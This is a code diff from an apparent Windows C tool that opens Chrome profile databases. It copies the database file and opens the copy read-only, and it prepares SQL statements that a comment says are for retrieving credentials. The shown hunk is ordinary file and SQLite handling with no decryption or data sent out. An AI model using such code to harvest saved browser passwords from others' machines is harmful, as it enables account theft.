@@ -152,28 +152,40 @@ BOOL open_database(PSTR database_location, void** handle_db, PSTR buf_outMsg, WO
 	}
 
 	if (open_copied_instance) {
-		if ((err = strcat_s(temp_database_location, MAX_PATH, "2")) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
+		CHAR new_database[MAX_PATH] = "\0";
+		if ((err = strcat_s(new_database, MAX_PATH, temp_database_location)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
 			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending profile name to database_location error: %d\n", err);)
 			return FALSE;
 		}
+		if ((err = strcat_s(new_database, MAX_PATH, "2")) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
+			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending profile name to database_location error: %d\n", err);)
+				return FALSE;
+		}
+		if (!CopyFileA(temp_database_location, new_database, FALSE)) {
+			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Making copy of database error. Trying to continue.\n");)
+		}
+		if ((status = sqlite3_open_v2(new_database, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
+			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
+			return FALSE;
+		}
 	}
-
-	if ((status = sqlite3_open_v2(temp_database_location, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
-		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
-		return FALSE;
+	else {
+		if ((status = sqlite3_open_v2(temp_database_location, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
+			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
+			return FALSE;
+		}
 	}
-
 	return TRUE;
 }
 
 // Prepare and get the sql handle for sql statement in order to retrieve credentials
-BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
-	int status;
-	if ((status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0)) != SQLITE_OK) {
+int prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
+	int status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0);
+	if (status != SQLITE_OK) {
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
-		return FALSE;
+		return status;
 	}
-	return TRUE;
+	return 0;
 }
 
 // Iterate over results
